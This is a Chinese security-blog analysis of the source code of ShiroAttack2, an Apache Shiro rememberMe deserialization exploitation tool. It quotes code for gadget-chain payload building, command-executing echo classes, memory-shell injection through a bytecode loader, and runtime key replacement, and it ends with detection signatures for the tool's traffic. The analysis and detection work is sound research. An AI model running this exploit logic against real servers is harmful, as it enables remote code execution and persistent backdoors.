#  ShiroAttack2工具原理分析

原创 藏青@星尘实验室  [ 雁行安全团队 ](javascript:void\(0\);)

**雁行安全团队** ![]()

微信号 YX_Security

功能介绍 四叶草安全雁行安服团队—黑客与POC的火花

____

___发表于_

## 前言

最近想要针对Shiro的利用工具扩展利用链，但自己完全写一个工具即麻烦也没有必要，因此想要通过`SummerSec`师傅开源的工具ShiroAttack2扩展来实现，既然要扩展首先就得了解项目的源码实现。本片文章中我不会通篇的对这个项目代码进行分析，只抽出几个我认为的要点进行分析。

## 源码分析

### 密钥验证

在这款工具中，密钥验证主要是分为两种情况，一种是用户指定密钥，一种是未指定密钥时爆破密钥。无论是使用哪种方式来验证key都需要调用`checkIsShiro`方法判断是否为shiro。

    
          1. //指定key
    
      2. @FXML
    
      3.     void crackSpcKeyBtn(ActionEvent event) {
    
      4.         this.initAttack();
    
      5.         if (this.attackService.checkIsShiro()) {
    
      6.             String spcShiroKey = this.shiroKey.getText();
    
      7.             if (!spcShiroKey.equals("")) {
    
      8.                 this.attackService.simpleKeyCrack(spcShiroKey);
    
      9.             } else {
    
      10.                 this.logTextArea.appendText(Utils.log("请输入指定密钥"));
    
      11.             }
    
      12.         }
    
      13.     }
    
      14. //爆破key
    
      15.     @FXML
    
      16.     void crackKeyBtn(ActionEvent event) {
    
      17.         this.initAttack();
    
      18.         if (this.attackService.checkIsShiro()) {
    
      19.             this.attackService.keysCrack();
    
      20.         }
    
      21.     }
    
    
    

`checkIsShiro`首先指定`remeberMe=1`通过返回结果是否包含`deleteMe`来判断是否为shiro框架。如果返回结果没有`deleteMe`则生成一个10位的随机数作为`remeberMe`的内容再去请求。这里之所以要生成一个位随机数我推测可能是防止WAF将`remeberMe=1`当作特征拦了。但是我这里还是想到了一种拦截思路，如果检测到`rememberMe=1`  
WAF直接阻断请求，那`result`的返回内容就会是`null`，在`result.contains("=deleteMe")`中就会触发异常，导致直接进入`catch`代码块，  
那样工具就无法检测是否为Shiro，后面的漏洞利用功能也会失效。

    
          1. public boolean checkIsShiro() {
    
      2.         boolean flag = false;
    
      3.         try {
    
      4.             HashMap<String, String> header = new HashMap();
    
      5.             //指定remeberMe=1
    
      6.             header.put("Cookie", this.shiroKeyWord + "=1");
    
      7.             String result = this.headerHttpRequest(header);
    
      8.             flag = result.contains("=deleteMe");
    
      9.             if (flag) {
    
      10.                 this.mainController.logTextArea.appendText(Utils.log("存在shiro框架！"));
    
      11.                 flag = true;
    
      12.             } else {
    
      13.                 HashMap<String, String> header1 = new HashMap();
    
      14.                 //生成10位随机数判断
    
      15.                 header1.put("Cookie", this.shiroKeyWord + "=" + AttackService.getRandomString(10));
    
      16.                 String result1 = this.headerHttpRequest(header1);
    
      17.                 flag = result1.contains("=deleteMe");
    
      18.                 if(flag){
    
      19.                     this.mainController.logTextArea.appendText(Utils.log("存在shiro框架！"));
    
      20.                     flag = true;
    
      21.                 }else {
    
      22.                     this.mainController.logTextArea.appendText(Utils.log("未发现shiro框架！"));
    
      23.                 }
    
      24.             }
    
      25.         } catch (Exception var4) {
    
      26.             if (var4.getMessage() != null) {
    
      27.                 this.mainController.logTextArea.appendText(Utils.log(var4.getMessage()));
    
      28.             }
    
      29.         }
    
      30.         return flag;
    
      31.     }
    
    
    

### 利用链爆破

无论使用什么利用链都需要和回显的方式配合，所以这里首先是拿出了利用链和回显方式并进行组合。组合后通过`:`分割，通过`gadgetCrack`检测这种利用链和回显方式是否存在。目前这款工具主要的利用链是CC利用链和Beanutils利用链。回显方式主要是`Tomcat`和`Spring`回显，作者后来版本也加了`通用回显`，这些回显方式之后我会分析。

    
          1. void crackGadgetBtn(ActionEvent event) {
    
      2.         String spcShiroKey = this.shiroKey.getText();
    
      3.         if (this.attackService == null) {
    
      4.             this.initAttack();
    
      5.         }
    
      6.         boolean flag = false;
    
      7.         if (!spcShiroKey.equals("")) {
    
      8.             //获取利用链和回显方式并进行组合
    
      9.             List<String> targets = this.attackService.generateGadgetEcho(this.gadgetOpt.getItems(), this.echoOpt.getItems());
    
      10.             for(int i = 0; i < targets.size(); ++i) {
    
      11.                 String[] t = ((String)targets.get(i)).split(":");
    
      12.                 String gadget = t[0];
    
      13.                 String echo = t[1];
    
      14.                 //检测利用链和回显方式是否存在
    
      15.                 flag = this.attackService.gadgetCrack(gadget, echo, spcShiroKey);
    
      16.                 if (flag) {
    
      17.                     break;
    
      18.                 }
    
      19.             }
    
      20.         } else {
    
      21.             this.logTextArea.appendText(Utils.log("请先手工填入key或者爆破Shiro key"));
    
      22.         }
    
      23.         if (!flag) {
    
      24.             this.logTextArea.appendText(Utils.log("未找到构造链"));
    
      25.         }
    
      26.     }
    
    
    

`gadgetCrack`生成`remeberMe`的内容并加上`Ctmd`请求头，最后判断返回中是否包含`08fb41620aa4c498a1f2ef09bbc1183c`判断是否利用成功，这里也可以当作这款工具的特征。

    
          1. public boolean gadgetCrack(String gadgetOpt, String echoOpt, String spcShiroKey) {
    
      2.         boolean flag = false;
    
      3.         try {
    
      4.             //生成rememberMe
    
      5.             String rememberMe = this.GadgetPayload(gadgetOpt, echoOpt, spcShiroKey);
    
      6.             if (rememberMe != null) {
    
      7.                 HashMap header = new HashMap();
    
      8.                 header.put("Cookie", rememberMe + ";");
    
      9.                 //header中加入Ctmd头
    
      10.                 header.put("Ctmd", "08fb41620aa4c498a1f2ef09bbc1183c");
    
      11.                 String result = this.headerHttpRequest(header);
    
      12.                 //判断返回值中是否有08fb41620aa4c498a1f2ef09bbc1183c
    
      13.                 if (result.contains("08fb41620aa4c498a1f2ef09bbc1183c")) {
    
      14.                     this.mainController.logTextArea.appendText(Utils.log("[*] 发现构造链:" + gadgetOpt + "  回显方式: " + echoOpt));
    
      15.                     this.mainController.logTextArea.appendText(Utils.log("[*] 请尝试进行功能区利用。"));
    
      16.                     this.mainController.gadgetOpt.setValue(gadgetOpt);
    
      17.                     this.mainController.echoOpt.setValue(echoOpt);
    
      18.                     gadget = gadgetOpt;
    
      19.                     attackRememberMe = rememberMe;
    
      20.                     flag = true;
    
      21.                 } else {
    
      22.                     this.mainController.logTextArea.appendText(Utils.log("[x] 测试:" + gadgetOpt + "  回显方式: " + echoOpt));
    
      23.                 }
    
      24.             }
    
      25.         } catch (Exception var8) {
    
      26.             this.mainController.logTextArea.appendText(Utils.log(var8.getMessage()));
    
      27.         }
    
      28.         return flag;
    
      29.     }
    
    
    

下面分析`remeberMe`生成部分，主要包含四个部分。

  * 获取利用链的Class对象并实例化

  * 根据回显方式创建`TemplatesImpl`对象

  * 传入`TemplatesImpl`通过getObject获取构建好的恶意对象

  * 构建好恶意对象后AES加密后返回

    
          1. public String GadgetPayload(String gadgetOpt, String echoOpt, String spcShiroKey) {
    
      2.         String rememberMe = null;
    
      3.         try {
    
      4.             //获取利用链的Class对象
    
      5.             Class<? extends ObjectPayload> gadgetClazz = com.summersec.attack.deser.payloads.ObjectPayload.Utils.getPayloadClass(gadgetOpt);
    
      6.             ObjectPayload<?> gadgetPayload = (ObjectPayload)gadgetClazz.newInstance();
    
      7.             //根据回显方式创建TemplatesImpl对象
    
      8.             Object template = Gadgets.createTemplatesImpl(echoOpt);
    
      9.             //创建恶意对象
    
      10.             Object chainObject = gadgetPayload.getObject(template);
    
      11.             //生成的恶意对象AES加密后返回
    
      12.             rememberMe = shiro.sendpayload(chainObject, this.shiroKeyWord, spcShiroKey);
    
      13.         } catch (Exception var9) {
    
      14. //            var9.printStackTrace();
    
      15.             this.mainController.logTextArea.appendText(Utils.log(var9.getMessage()));
    
      16.         }
    
      17.         return rememberMe;
    
      18.     }
    
    
    

获取利用链的Class对象并实例化

根据类名获取对应的Class对象

    
          1. public interface ObjectPayload<T> { T getObject(Object paramObject) throws Exception;
    
      2.     public static class Utils {
    
      3.         public static Class<? extends ObjectPayload> getPayloadClass(String className) {
    
      4.             Class<? extends ObjectPayload> clazz = null;
    
      5.             try {
    
      6.                 //根据类名获取Class对象
    
      7.                 clazz = (Class)Class.forName("com.summersec.attack.deser.payloads." + StringUtils.capitalize(className));
    
      8.             } catch (Exception exception) {}
    
      9.             return clazz;
    
      10.         }
    
      11.     }
    
      12. }
    
    
    

根据回显方式创建TemplatesImpl对象

通过Javasist生成回显类并转换为字节码赋值给`_bytecodes`属性。

    
          1. public static <T> T createTemplatesImpl(String payload, Class<T> tplClass, Class<?> abstTranslet) throws Exception {
    
      2.         T templates = tplClass.newInstance();
    
      3.         ClassPool pool = ClassPool.getDefault();
    
      4.         //根据名称通过forName加载回显的类
    
      5.         Class<? extends EchoPayload> echoClazz = Utils.getPayloadClass(payload);
    
      6.         EchoPayload<?> echoObj = (EchoPayload)echoClazz.newInstance();
    
      7.         //通过Javasist动态生成回显类
    
      8.         CtClass clazz = echoObj.genPayload(pool);
    
      9.         CtClass superClass = pool.get(abstTranslet.getName());
    
      10.         clazz.setSuperclass(superClass);
    
      11.         byte[] classBytes = clazz.toBytecode();
    
      12.         //将生成的回显类字节码赋值给_bytecodes属性
    
      13.         Field bcField = TemplatesImpl.class.getDeclaredField("_bytecodes");
    
      14.         bcField.setAccessible(true);
    
      15.         bcField.set(templates, new byte[][]{classBytes});
    
      16.         Field nameField = TemplatesImpl.class.getDeclaredField("_name");
    
      17.         nameField.setAccessible(true);
    
      18.         nameField.set(templates, "a");
    
      19.         return templates;
    
      20.     }
    
    
    

通过getObject获取恶意对象

通过getObject方法获取恶意对象，在这个工具里使用的利用链主要为CC链和`Beanutils`链。

AES加密构建好的恶意对象

由于Shiro在高版本中更换了GCM加密方式，因此根据版本的不同选择不同的加密算法。

    
          1. public String sendpayload(Object chainObject, String shiroKeyWord, String key) throws Exception {
    
      2.         byte[] serpayload = SerializableUtils.toByteArray(chainObject);
    
      3.         byte[] bkey = DatatypeConverter.parseBase64Binary(key);
    
      4.         byte[] encryptpayload = null;
    
      5.         //根据版本不同使用不同的加密算法
    
      6.         if (AttackService.aesGcmCipherType == 1) {
    
      7.             GcmEncrypt gcmEncrypt = new GcmEncrypt();
    
      8.             String byteSource = gcmEncrypt.encrypt(key,serpayload);
    
      9.             System.out.println(shiroKeyWord + "=" + byteSource);
    
      10.             return shiroKeyWord + "=" + byteSource;
    
      11.         } else {
    
      12.             encryptpayload = AesUtil.encrypt(serpayload, bkey);
    
      13.         }
    
      14.         return shiroKeyWord + "=" + DatatypeConverter.printBase64Binary(encryptpayload);
    
      15.     }
    
    
    

关于利用链这里我想多提一些内容，因为本来分析这款工具的原理就是为了扩展利用链。通过上面的分析可以看到作者做了一个抽象，`getObject`传入的对象是构建好的`TemplateImpl`对象，所以这也是作者实现的利用链不多的原因，因为不是所有的利用链封装的都是`TemplateImpl`对象，而且也有很多利用方式无法回显利用。

### 回显方式分析

#### Tomcat

Tomcat的回显主要的思路都是获取Response对象，并向Response中写入执行结果来实现，下面我对多种Tomcat回显的方式做一个简要总结。

  * `ApplicationFilterChain#lastServicedResponse`中记录了response的内容，所以可以通过获取`lastServicedResponse`来获取Response对象并进行写入。使用这种方式需要请求两次，因为在默认情况下`lastServicedResponse`中并不会记录`response`，所以第一次请求需要修改一个属性值让`lastServicedResponse`记录`response`。但是这种方式不能用在Shiro反序列化中回显，因为Shiro的反序列化发生在`lastServicedResponse`缓存Response之前，所以我们无法在反序列化的过程中拿到缓存中的Response对象。

  * `AbstractProcessor#response`中存储了Response对象，可以通过获取这个属性值获取response对象。这种方式是通过`Thread.currentThread.getContextClassLoader()`获取`webappClassLoader`，再获取到Context最后一层层反射获取Response对象。这种方式的主要问题是代码量过多，在Shiro的利用中可能由于请求头过大导致利用失败。虽然可以通过在RemeberMe中只实现一个ClassLoader加载Body中的Class这种方式绕过。但是这样设计可能会导致和其他回显的利用方式有些差别，导致代码无法复用，所以我猜测这也是作者没有使用这种方式回显的原因。

  * 首先通过`Thread.currentThread().getThreadGroup()`获取线程数组，从线程数组中找到包含`http`但不包含`exec`的线程。从保存的`NioEndPoint`中拿到`ConnectionHandler`，再从Handler中拿到`RequestInfo`对象，最后从`RequestInfo`中拿到Response。

最后一种方式是这款工具使用的方式，虽然这种获取方式比较简洁，但是好像没有师傅给出为什么要这么获取的原因，下面我尝试对这种利用方式做出解释。

首先我们要知道，这种方式实际上是从`ClientPoller`线程中取出的`NioEndPoint`对象，并拿到`RequestInfo`对象。

为什么从`**ClientPoller**` 中可以拿到`**NioEndPoint**` 对象？

ClientPoller对象是在`NioEndPoint#startInternal`时创建的，在创建`ClientPoller`线程时传入了`poller`对象作为target属性，因此可以从`ClientPoller->target`中拿到poller对象，而`Poller`又是`NioEndpoint`的内部类，所以其`this$0`持有外部类`NioEndPoint`的引用。因此从`ClientPoller`线程中获取到`NioEndPoint`对象。

    
          1. @Override
    
      2.     public void startInternal() throws Exception {
    
      3. ...
    
      4.             initializeConnectionLatch();
    
      5.             // Start poller thread
    
      6.             poller = new Poller();
    
      7.             Thread pollerThread = new Thread(poller, getName() + "-ClientPoller");
    
      8.             pollerThread.setPriority(threadPriority);
    
      9.             pollerThread.setDaemon(true);
    
      10.             pollerThread.start();
    
      11.             startAcceptorThread();
    
      12.         }
    
      13.     }
    
    
    

另外`Acceptor`中也持有`NioEndpoint`对象，因此也可以获取到`RequestInfo`对象。

![]()

为什么要通过for循环进行遍历Thread？

虽然上面我们看到`ClientPoller`线程只有一个，但是作者在实现工具的时候却使用了for循环遍历，这是为什么？

    
          1. Thread[] var5 = (Thread[]) getFV(Thread.currentThread().getThreadGroup(), "threads");
    
      2.         for (int var6 = 0; var6 < var5.length; ++var6) {
    
      3.             Thread var7 = var5[var6];
    
      4.             if (var7 != null) {
    
      5.                 String var3 = var7.getName();
    
      6.                 if (!var3.contains("exec") && var3.contains("http")) {
    
      7.                     Object var1 = getFV(var7, "target");
    
      8.             ...
    
    
    

我当前的环境是`springboot`中内置的`tomcat`,但是打开自己下载的`tomcat`发现其实创建的`ClientPoller`不一定只有一个,查阅资料默认配置下`ClientPoller`的个数是CPU的核数。

    
          1. pollers = new Poller[getPollerThreadCount()];
    
      2.             for (int i=0; i<pollers.length; i++) {
    
      3.                 pollers[i] = new Poller();
    
      4.                 Thread pollerThread = new Thread(pollers[i], getName() + "-ClientPoller-"+i);
    
      5.                 pollerThread.setPriority(threadPriority);
    
      6.                 pollerThread.setDaemon(true);
    
      7.                 pollerThread.start();
    
      8.             }
    
    
    

所以我认为这个for循环的这么写应该更合理一些

    
          1. Thread[] var5 = (Thread[]) getFV(Thread.currentThread().getThreadGroup(), "threads");
    
      2.         for (int var6 = 0; var6 < var5.length; ++var6) {
    
      3.             Thread var7 = var5[var6];
    
      4.             if (var7 != null) {
    
      5.                 String var3 = var7.getName();
    
      6.                 if (var3.contains("ClientPoller")) {
    
      7.                     Object var1 = getFV(var7, "target");
    
      8.             ...
    
    
    

或者通过`Acceptor`来获取，`Acceptor`主要用来接收连接，默认为一个。

    
          1. if (var3.contains("Acceptor")) {
    
      2.                     Object var1 = getFV(var7, "target");
    
      3.                     if (var1 instanceof Runnable) {
    
      4.                         try {
    
      5.                             var1 = getFV(getFV(getFV(var1, "endpoint"), "handler"), "global");
    
    
    

#### Spring

通过`RequestContextHolder`的静态方法获取`RequestAttributes`对象，在通过`getResponse`获取Response对象。

#### AllEcho

这种方式基本思路是遍历当前线程保存的所有非静态属性，直到找到`Request`或`Response`对象。默认遍历的深度是50层。

    
          1. private static void Find(Object start,int depth){
    
      2.         if(depth > max_depth||(req!=null&&resp!=null)){
    
      3.             return;
    
      4.         }
    
      5.     //开始时start传入的是Thread.currentThread()对象
    
      6.         Class n=start.getClass();
    
      7.         do{
    
      8.            //获取当前对象中保存的属性
    
      9.             for (Field declaredField : n.getDeclaredFields()) {
    
      10.                 declaredField.setAccessible(true);
    
      11.                 Object obj = null;
    
      12.                 try{
    
      13.                     //判断属性是否为static，是则跳过
    
      14.                     if(Modifier.isStatic(declaredField.getModifiers())){
    
      15.                         //静态字段
    
      16.                         //obj = declaredField.get(null);
    
      17.                     }else{
    
      18.                         obj = declaredField.get(start);
    
      19.                     }
    
      20.                     if(obj != null){
    
      21.                         //不是数组直接调用proc方法检查obj中是否为request或response对象
    
      22.                         if(!obj.getClass().isArray()){
    
      23.                             proc(obj,depth);
    
      24.                         }else{
    
      25.                          //是数组则判断持有的对象是否为基本类型，不是基本类型才会遍历数组并判断是否为request或response对象
    
      26.                             if(!obj.getClass().getComponentType().isPrimitive()) {
    
      27.                                 for (Object o : (Object[]) obj) {
    
      28.                                     proc(o, depth);
    
      29.                                 }
    
      30.                             }
    
      31.                         }
    
      32.                     }
    
      33.                 }catch (Exception e){
    
      34.                     e.printStackTrace();
    
      35.                 }
    
      36.             }
    
      37.         }while(
    
      38.             //获取父类并遍历属性
    
      39.                 (n = n.getSuperclass())!=null
    
      40.         );
    
      41.     }
    
    
    

判断当前对象是否持有request和response类型，如果是则执行命令并写入Response。

    
          1. private static void proc(Object obj,int depth){
    
      2.      //如果遍历层数已经是最大层数则返回
    
      3.         if(depth > max_depth||(req!=null&&resp!=null)){
    
      4.             return;
    
      5.         }
    
      6.      // 如果该类型是java.lang包下的并且已经处理过了则跳过
    
      7.         if(!isSkiped(obj)){
    
      8.             //判断obj类型是否为HttpServletRequest.class的子类
    
      9.             if(req==null&&ReqC.isAssignableFrom(obj.getClass())){
    
      10.                 req = (HttpServletRequest)obj;
    
      11.                 if(req.getHeader("cmd")==null)
    
      12.                     req=null;
    
      13.             //判断obj类型是否为HttpServletResponse.class的子类
    
      14.             }else if(resp==null&&RespC.isAssignableFrom(obj.getClass())){
    
      15.                 resp = (HttpServletResponse) obj;
    
      16.             }
    
      17.             //如果获取到request和response对象，则执行命令并写入
    
      18.             if(req!=null&&resp!=null){
    
      19.                 try {
    
      20.                     PrintWriter os = resp.getWriter();
    
      21.                     Process proc = Runtime.getRuntime().exec(req.getHeader("cmd"));
    
      22.                     proc.waitFor();
    
      23.                     Scanner scanner = new Scanner(proc.getInputStream());
    
      24.                     scanner.useDelimiter("\\A");
    
      25.                     os.print("Test by fnmsd "+scanner.next());
    
      26.                     os.flush();
    
      27.                 }catch (Exception e){
    
      28.                 }
    
      29.                 return;
    
      30.             }
    
      31.             //继续遍历
    
      32.             Find(obj,depth+1);
    
      33.         }
    
      34.     }
    
    
    

### 内存马

由于注入内存马的代码量比较大，直接将数据带到请求头中会导致请求头过大而注入失败，所以这里作者将实际内存马的内容和注入的代码分开，post的参数dy中才是真正注入内存马的代码。

    
          1. public void injectMem(String memShellType, String shellPass, String shellPath) {
    
      2.     //获取rememberMe的内容，这里传入的回显类是InjectMemTool，也就是InjectMemTool的字节码将会被放到TemplateImpl->_bytecodes属性中
    
      3.         String injectRememberMe = this.GadgetPayload(gadget, "InjectMemTool", realShiroKey);
    
      4.         if (injectRememberMe != null) {
    
      5.                //请求头中传入shell密码和路径。
    
      6.             HashMap<String, String> header = new HashMap();
    
      7.             header.put("Cookie", injectRememberMe);
    
      8.             header.put("p", shellPass);
    
      9.             header.put("path", shellPath);
    
      10.             try {
    
      11.                 //根据内存马的类型得到对应的字节码，base64后传给dyv参数。
    
      12.                 String b64Bytecode = MemBytes.getBytes(memShellType);
    
      13.                 String postString = "dy=" + b64Bytecode;
    
      14.                 String result = this.bodyHttpRequest(header, postString);
    
      15.                 //返回Success则代表注入成功
    
      16.                 if (result.contains("->|Success|<-")) {
    
      17.                     String httpAddress = Utils.UrlToDomain(this.url);
    
      18.                     this.mainController.InjOutputArea.appendText(Utils.log(memShellType + "  注入成功!"));
    
      19.                     this.mainController.InjOutputArea.appendText(Utils.log("路径：" + httpAddress + shellPath));
    
      20.                     if (!memShellType.equals("reGeorg[Servlet]")) {
    
      21.                         this.mainController.InjOutputArea.appendText(Utils.log("密码：" + shellPass));
    
      22.                     }
    
      23.                 } else {
    
      24.                     if (result.contains("->|") && result.contains("|<-")) {
    
      25.                         this.mainController.InjOutputArea.appendText(Utils.log(result));
    
      26.                     }
    
      27.                     this.mainController.InjOutputArea.appendText(Utils.log("注入失败,请更换注入类型或者更换新路径"));
    
      28.                 }
    
      29.             } catch (Exception var10) {
    
      30.                 this.mainController.InjOutputArea.appendText(Utils.log(var10.getMessage()));
    
      31.             }
    
      32.             this.mainController.InjOutputArea.appendText(Utils.log("-------------------------------------------------"));
    
      33.         }
    
      34.     }
    
    
    

下面我们看下`InjectMemTool`的内容，下面是`InjectMemTool`构造方法的内容，前面内容和`Tomcat`回显的内容相同，从线程数组中获取request和response对象，我没有在代码中给出来。

    
          1. o = getFV(p, \"req\");
    
      2.     resp = o.getClass().getMethod(\"getResponse\", new Class[0]).invoke(o, new Object[0]);
    
      3.   
    
    
      4.                         Object conreq = o.getClass().getMethod(\"getNote\", new Class[]{int.class}).invoke(o, new Object[]{new Integer(1)});
    
      5.         //获取dy参数保存的内容
    
      6.                         dy = (String) conreq.getClass().getMethod(\"getParameter\", new Class[]{String.class}).invoke(conreq, new Object[]{new String(\"dy\")});
    
      7.                         if (dy != null && !dy.isEmpty()) {
    
      8.                             //base64解码
    
      9.                             byte[] bytecodes = org.apache.shiro.codec.Base64.decode(dy);
    
      10.                             //获取defineClass方法
    
      11.                             java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod(\"defineClass\", new Class[]{byte[].class, int.class, int.class});
    
      12.                             defineClassMethod.setAccessible(true);
    
      13.                 //调用defineClass加载dy中保存的字节码
    
      14.                             Class cc = (Class) defineClassMethod.invoke(this.getClass().getClassLoader(), new Object[]{bytecodes, new Integer(0), new Integer(bytecodes.length)});
    
      15.                 //实例化对象并调用equals方法
    
      16.                             cc.newInstance().equals(conreq);
    
      17.                             done = true;
    
      18.                         }
    
    
    

### 修改shiro key

`SummerSec`师傅实现了修改shiro  
key的功能了，有了这个功能渗透就真的是比手速了，或许以后渗透还需到了解如何动态修补各种漏洞，哈哈，开个玩笑。

修改Shiro  
key的思路是找到`ShiroFilterFactoryBean`对象，从这个对象中可以拿到`remeberMeMamanger`，这个对象中可以获取加密和解密的密钥。

![]()

在`filterConfigs`中保存了`ShiroFilterFactoryBean`实例，因此可以从中获取key。

![]()

`SummerSec`师傅的实现代码如下,前面获取`filterConfigs`的代码就不分析了，和注册Filter内存马的时候一致。

    
          1. org.apache.tomcat.util.threads.TaskThread thread = (org.apache.tomcat.util.threads.TaskThread) Thread.currentThread();
    
      2.         java.lang.reflect.Field field = thread.getClass().getSuperclass().getDeclaredField("contextClassLoader");
    
      3.         field.setAccessible(true);
    
      4.         Object obj = field.get(thread);
    
      5.         field = obj.getClass().getSuperclass().getSuperclass().getDeclaredField("resources");
    
      6.         field.setAccessible(true);
    
      7.         obj = field.get(obj);
    
      8.         field = obj.getClass().getDeclaredField("context");
    
      9.         field.setAccessible(true);
    
      10.         obj = field.get(obj);
    
      11.         //获取filterConfigs属性
    
      12.         field = obj.getClass().getSuperclass().getDeclaredField("filterConfigs");
    
      13.         field.setAccessible(true);
    
      14.         obj = field.get(obj);
    
      15.         java.util.HashMap<String, Object> objMap = (java.util.HashMap<String, Object>) obj;
    
      16.         //遍历filterConfigs
    
      17.         java.util.Iterator<Map.Entry<String, Object>> entries = objMap.entrySet().iterator();
    
      18.         while (entries.hasNext()) {
    
      19.             Map.Entry<String, Object> entry = entries.next();
    
      20.             //检测key是否为shiroFilterFactoryBean
    
      21.             if (entry.getKey().equals("shiroFilterFactoryBean")) {
    
      22.                 obj = entry.getValue();
    
      23.                 field = obj.getClass().getDeclaredField("filter");
    
      24.                 field.setAccessible(true);
    
      25.                 obj = field.get(obj);
    
      26.                 field = obj.getClass().getSuperclass().getDeclaredField("securityManager");
    
      27.                 field.setAccessible(true);
    
      28.                 obj = field.get(obj);
    
      29.                 field = obj.getClass().getSuperclass().getDeclaredField("rememberMeManager");
    
      30.                 field.setAccessible(true);
    
      31.                 obj = field.get(obj);
    
      32.                 //通过反射调用setEncryptionCipherKey修改加密key
    
      33.                 java.lang.reflect.Method setEncryptionCipherKey = obj.getClass().getSuperclass().getDeclaredMethod("setEncryptionCipherKey", new Class[]{byte[].class});
    
      34.                 byte[] bytes = this.base64Decode("FcoRsBKe9XB3zOHbxTG0Lw==");
    
      35.                 setEncryptionCipherKey.invoke(obj, new Object[]{bytes});
    
      36.                    //通过反射调用setDecryptionCipherKey修改解密key
    
      37.                 java.lang.reflect.Method setDecryptionCipherKey = obj.getClass().getSuperclass().getDeclaredMethod("setDecryptionCipherKey", new Class[]{byte[].class});
    
      38.                 setDecryptionCipherKey.invoke(obj, new Object[]{bytes});
    
      39.             }
    
      40.         }
    
    
    

但是这种方式有一个问题，如果我设置`ShiroFilterFactoryBean`时设置了name属性，那么遍历`filterConfigs`是，保存`ShiroFilterFactoryBean`的Filter的名称就会是`shiroFilter`，所以会修改失败。

    
          1. @Bean(
    
      2.             name = {"shiroFilter"}
    
      3.     )
    
      4.     ShiroFilterFactoryBean shiroFilterFactoryBean(SecurityManager securityManager) {
    
      5.         ShiroFilterFactoryBean bean = new ShiroFilterFactoryBean();
    
      6.         bean.setSecurityManager(securityManager);
    
      7.         bean.setLoginUrl("/login");
    
      8.         bean.setUnauthorizedUrl("/unauth");
    
      9.         Map<String, String> map = new LinkedHashMap();
    
      10.         map.put("/doLogin", "anon");
    
      11.         map.put("/index/**", "authc");
    
      12.         bean.setFilterChainDefinitionMap(map);
    
      13.         return bean;
    
      14.     }
    
    
    

![]()

但是无论有没有配置name属性，filter属性中保存的filter的类名一定是`ShiroFilterFactoryBean`,所以我们可以先获取filter属性，然后查看类名是否为`ShiroFilterFactoryBean`，如果是则通过反射调用修改key。

![]()

    
          1. while (entries.hasNext()) {
    
      2.             Map.Entry<String, Object> entry = entries.next();
    
      3.             obj = entry.getValue();
    
      4.             //先获取filter属性
    
      5.             field = obj.getClass().getDeclaredField("filter");
    
      6.             field.setAccessible(true);
    
      7.             obj = field.get(obj);
    
      8.             //判断保存的类型是否为ShiroFilterFactoryBean
    
      9.             if (obj.getClass().toString().contains("ShiroFilterFactoryBean")) {
    
      10.                 field = obj.getClass().getSuperclass().getDeclaredField("securityManager");
    
      11.                 field.setAccessible(true);
    
      12.                 obj = field.get(obj);
    
      13.                 field = obj.getClass().getSuperclass().getDeclaredField("rememberMeManager");
    
      14.                 field.setAccessible(true);
    
      15.                 obj = field.get(obj);
    
      16.                 java.lang.reflect.Method setEncryptionCipherKey = obj.getClass().getSuperclass().getDeclaredMethod("setEncryptionCipherKey", new Class[]{byte[].class});
    
      17.                 byte[] bytes = this.base64Decode("FcoRsBKe9XB3zOHbxTG0Lw==");
    
      18.                 setEncryptionCipherKey.invoke(obj, new Object[]{bytes});
    
      19.                 java.lang.reflect.Method setDecryptionCipherKey = obj.getClass().getSuperclass().getDeclaredMethod("setDecryptionCipherKey", new Class[]{byte[].class});
    
      20.                 setDecryptionCipherKey.invoke(obj, new Object[]{bytes});
    
      21.             }
    
      22.         }
    
    
    

## 总结

通过学习师傅写的工具，对很多技术的实现细节有了一些了解，确实也学到了很多。最后总结部分我想简单聊一下这个工具的利用特征。

  * ·在验证key或者爆破key前，会发送RemeberMe=1，如果检测到Cookie中包含`RemeberMe=1`直接将请求断开，会导致这个工具无法检测密钥，后续的功能也将无法用。

  * 利用链爆破部分会发送`Ctmd:08fb41620aa4c498a1f2ef09bbc1183c`作为是否可以回显的标志，这一部分是硬编码的，所以如果检测到包含`Ctmd:08fb41620aa4c498a1f2ef09bbc1183c`，也是有人正在利用该工具检测shiro

  * 内存马注入时，会在请求中加上`p`和`path`参数，并且会在post请求中加上`dy`参数。

## 参考

  * ShiroAttack2

  * Java内存马：一种Tomcat全版本获取StandardContext的新方法

  * Java中间件通用回显方法的问题及处理(7.7更新)

预览时标签不可点

微信扫一扫  
关注该公众号

继续滑动看下一个

# ShiroAttack2工具原理分析

原创 藏青@星尘实验室  [ 雁行安全团队 ](javascript:void\(0\);)

轻触阅读原文

![]()

雁行安全团队

向上滑动看下一个

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看 分享 留言

